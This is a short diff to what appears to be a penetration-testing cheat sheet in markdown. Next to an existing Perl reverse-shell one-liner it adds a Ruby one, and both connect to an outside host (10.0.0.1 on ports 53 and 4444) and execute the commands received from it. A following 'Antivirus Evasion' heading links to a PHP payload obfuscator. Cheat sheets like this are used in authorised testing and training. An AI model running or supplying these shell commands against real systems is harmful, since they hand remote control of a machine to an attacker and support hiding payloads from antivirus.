@@ -123,7 +123,9 @@ Python3:
 ### Perl 
 
     perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:53");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'  
-    
+### Ruby     
+
+    ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'    
     
 ## Antivirus Evasion  
 [PHP payload encoder](https://www.gaijin.at/en/tools/php-obfuscator#result)        
